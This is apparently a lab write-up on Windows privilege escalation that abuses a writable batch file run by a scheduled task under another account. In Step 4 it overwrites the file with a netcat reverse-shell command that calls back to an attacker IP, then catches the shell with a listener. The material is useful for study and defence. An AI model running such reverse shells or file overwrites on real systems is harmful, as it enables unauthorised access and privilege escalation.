# Scheduled Tasks

Scheduled Tasks allow Windows to automatically execute commands, programs, or scripts based on configured triggers. From a Privilege Escalation perspective, they become interesting when a low-privileged user can modify a file that is executed by a Scheduled Task running under another account.

# Lab

## Step 1: Enumerate the Scheduled Task

First, we enumerate the Scheduled Task to determine what it executes and which account is used to run it.

```
schtasks /query /tn vulntask /fo list /v
```

The command options are:

```
/query
```

Displays information about Scheduled Tasks.

```
/tn vulntask
```

Specifies the Scheduled Task named `vulntask`.

```
/fo list
```

Displays the results in List format.

```
/v
```

Enables Verbose output, providing detailed information about the task.

![](../../../../Images/Pasted%20image%2020260926222543.png)

## Step 2: Identify the Important Information

From the output, two fields are particularly important:

```
Task To Run: C:\tasks\schtask.bat
Run As User: taskusr1
```

### Task To Run

```
C:\tasks\schtask.bat
```

This tells us which file will be executed when the Scheduled Task runs.

### Run As User

```
taskusr1
```

This tells us which Windows account will execute the Scheduled Task.

Therefore, the execution flow is:

```
Scheduled Task
      ↓
C:\tasks\schtask.bat
      ↓
Executed as taskusr1
```

## Step 3: Check File Permissions

Next, we check our permissions over the file executed by the task.

![](../../../../Images/Pasted%20image%2020260926222739.png)

The results show that we have **Full Control** over the file.

This is the important misconfiguration: we can modify a file that is executed by a Scheduled Task running under another account.

## Step 4: Modify the Scheduled Task Script

Since we have sufficient permissions, we replace the existing contents of `schtask.bat` with a Netcat command that establishes a reverse shell back to our attacking machine.

```
echo C:\tools\nc64.exe -e cmd.exe 192.168.141.147 4444 > schtask.bat
```

This overwrites the contents of `schtask.bat`.

The command uses Netcat to execute `cmd.exe` and connect back to:

```
192.168.141.147:4444
```

![](../../../../Images/Pasted%20image%2020260926223103.png)

## Step 5: Start the Listener

On the attacking machine, we start a Netcat listener on the same port:

```
nc -lvp 4444
```

The listener waits for the reverse connection from the Windows machine.

![](../../../../Images/Pasted%20image%2020260926223225.png)

## Step 6: Receive the Shell

Once the Scheduled Task is executed, Windows runs the modified `schtask.bat` under the configured `Run As User` account.

The Netcat command then connects back to our listener, providing us with a shell running under the task's execution context.

![](../../../../Images/Pasted%20image%2020260926223436.png)

# Attack Chain

```
Enumerate Scheduled Task
        ↓
Identify Task To Run
        ↓
Identify Run As User
        ↓
Check File Permissions
        ↓
File is Writable
        ↓
Modify the Scheduled Task Script
        ↓
Scheduled Task Executes
        ↓
Reverse Shell
        ↓
Shell as taskusr1
```

# Key Takeaway

The Scheduled Task itself is not necessarily vulnerable. The important weakness is the combination of:

- A Scheduled Task executing with the privileges of another account.
- The task executing a script or binary.
- A low-privileged user having permission to modify that file.

The general Privilege Escalation principle is:

> **If you can control something that a more privileged account executes, you may be able to execute code with that account's privileges.**